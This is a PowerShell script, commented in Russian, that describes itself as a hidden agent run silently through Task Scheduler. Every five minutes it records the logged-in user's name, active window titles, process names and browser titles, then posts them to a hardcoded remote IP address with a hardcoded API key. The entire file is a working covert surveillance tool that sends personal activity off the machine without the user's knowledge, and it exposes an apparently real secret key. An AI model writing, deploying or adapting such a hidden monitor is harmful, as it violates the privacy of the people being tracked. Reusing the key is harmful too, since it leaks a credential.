# Скрытый агент для сбора и отправки активности пользователя
# Совместим с PowerShell 5.1 и ниже (Windows 10)
# Запускается скрыто через Task Scheduler

# Конфигурация
$GOOGLE_SERVER_URL = "http://35.232.108.72"
$REMOTE_WORKTIME_API_KEY = "BsKFpZmdp6ocPKUD6g6YxTgMSTZEaPZXkbddxsifERA="
$LOG_FILE = "$env:APPDATA\mesendger\activity_agent.log"
$DATA_FILE = "$env:APPDATA\mesendger\activity_data.json"
$INTERVAL_SECONDS = 300  # 5 минут

# Создаём директории
$logDir = Split-Path -Parent $LOG_FILE
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}

# Добавляем Win32 API функции (совместимо с PS 5.1)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
}
"@ -ErrorAction SilentlyContinue

# Функция логирования
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LOG_FILE -Append -Encoding UTF8
}

# Функция получения активного окна
function Get-ActiveWindow {
    try {
        $hwnd = [Win32]::GetForegroundWindow()
        if ($hwnd -eq [IntPtr]::Zero) {
            return "Unknown"
        }
        $sb = New-Object System.Text.StringBuilder 256
        $result = [Win32]::GetWindowText($hwnd, $sb, $sb.Capacity)
        $windowText = $sb.ToString()
        if ([string]::IsNullOrEmpty($windowText)) {
            return "Unknown"
        }
        return $windowText
    } catch {
        return "Unknown"
    }
}

# Функция получения информации о процессе (совместимо с PS 5.1)
function Get-ActiveProcess {
    try {
        $hwnd = [Win32]::GetForegroundWindow()
        if ($hwnd -eq [IntPtr]::Zero) {
            return @{ name = "Unknown"; path = "" }
        }
        $procId = 0
        [Win32]::GetWindowThreadProcessId($hwnd, [ref]$procId) | Out-Null
        
        if ($procId -eq 0) {
            return @{ name = "Unknown"; path = "" }
        }
        
        $proc = $null
        try {
            $proc = Get-Process -Id $procId -ErrorAction Stop
        } catch {
            return @{ name = "Unknown"; path = "" }
        }
        
        if ($proc) {
            $procPath = ""
            try {
                if ($proc.Path) {
                    $procPath = $proc.Path
                }
            } catch {
                $procPath = ""
            }
            
            return @{
                name = $proc.ProcessName
                path = $procPath
            }
        }
    } catch {}
    return @{ name = "Unknown"; path = "" }
}

# Функция получения информации о браузере
function Get-BrowserUrl {
    try {
        $activeWindow = Get-ActiveWindow
        $hwnd = [Win32]::GetForegroundWindow()
        
        if ($hwnd -eq [IntPtr]::Zero) {
            return ""
        }
        
        $procId = 0
        [Win32]::GetWindowThreadProcessId($hwnd, [ref]$procId) | Out-Null
        
        if ($procId -eq 0) {
            return ""
        }
        
        $proc = $null
        try {
            $proc = Get-Process -Id $procId -ErrorAction Stop
        } catch {
            return ""
        }
        
        if ($proc) {
            $procName = $proc.ProcessName.ToLower()
            # Проверяем, является ли активное окно браузером
            if ($procName -match "chrome|msedge|firefox|opera") {
                # URL получается сложно, поэтому возвращаем заголовок окна (может содержать URL)
                if ($activeWindow -match "http") {
                    return $activeWindow
                }
                return "${procName}://active-tab"
            }
        }
    } catch {}
    return ""
}

# Функция сбора данных активности (совместимо с PS 5.1)
function Collect-Activity {
    try {
        $username = $env:USERNAME
        $now = Get-Date
        $timestamp = $now.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
        
        # Получаем активное окно
        $activeWindow = Get-ActiveWindow
        
        # Получаем информацию о процессе
        $hwnd = [Win32]::GetForegroundWindow()
        $procId = 0
        $processName = "Unknown"
        
        if ($hwnd -ne [IntPtr]::Zero) {
            [Win32]::GetWindowThreadProcessId($hwnd, [ref]$procId) | Out-Null
            if ($procId -ne 0) {
                try {
                    $proc = Get-Process -Id $procId -ErrorAction Stop
                    if ($proc) {
                        $processName = $proc.ProcessName
                    }
                } catch {
                    $processName = "Unknown"
                }
            }
        }
        
        $browserUrl = Get-BrowserUrl
        
        $activityData = @{
            username = $username
            timestamp = $timestamp
            idleMinutes = 0
            procName = $processName
            windowTitle = $activeWindow
            browserUrl = $browserUrl
        }
        
        return $activityData
    } catch {
        Write-Log "Error collecting activity: $($_.Exception.Message)"
        return $null
    }
}

# Функция отправки данных (совместимо с PS 5.1)
function Send-ActivityData {
    param([array]$ActivityData)
    
    try {
        if (-not $ActivityData -or $ActivityData.Count -eq 0) {
            return $false
        }
        
        # Сервер ожидает массив событий напрямую, не в объекте activities
        $data = $ActivityData | ConvertTo-Json -Depth 10 -Compress
        
        Write-Log "Sending $($ActivityData.Count) activity records"
        
        $headers = @{
            "X-API-Key" = $REMOTE_WORKTIME_API_KEY
            "Content-Type" = "application/json"
        }
        
        $response = Invoke-RestMethod -Uri "$GOOGLE_SERVER_URL/api/activity-log-batch" `
            -Method POST `
            -Headers $headers `
            -Body $data `
            -TimeoutSec 10 `
            -ErrorAction Stop
        
        if ($response) {
            $responseJson = $response | ConvertTo-Json -Compress
            Write-Log "Success: $responseJson"
            return $true
        } else {
            Write-Log "Success: Empty response"
            return $true
        }
    } catch {
        $errorMsg = $_.Exception.Message
        if ($_.Exception.Response) {
            try {
                $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $responseBody = $reader.ReadToEnd()
                $errorMsg = "$errorMsg - Response: $responseBody"
            } catch {}
        }
        Write-Log "Error sending data: $errorMsg"
        return $false
    }
}

# Главный цикл
$activityBuffer = @()

try {
    Write-Log "Activity agent started (PowerShell $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor))"
    
    while ($true) {
        $activity = Collect-Activity
        
        if ($activity) {
            $activityBuffer += $activity
            
            # Отправляем каждые 5 записей
            if ($activityBuffer.Count -ge 5) {
                if (Send-ActivityData -ActivityData $activityBuffer) {
                    $activityBuffer = @()
                }
            }
        }
        
        Start-Sleep -Seconds $INTERVAL_SECONDS
    }
} catch {
    Write-Log "Fatal error: $($_.Exception.Message)"
    Write-Log "Stack trace: $($_.ScriptStackTrace)"
    
    # Сохраняем неотправленные данные
    if ($activityBuffer -and $activityBuffer.Count -gt 0) {
        try {
            $jsonData = $activityBuffer | ConvertTo-Json -Depth 10
            $jsonData | Out-File -FilePath $DATA_FILE -Encoding UTF8
            Write-Log "Saved $($activityBuffer.Count) unsent records to $DATA_FILE"
        } catch {
            Write-Log "Error saving data: $($_.Exception.Message)"
        }
    }
}
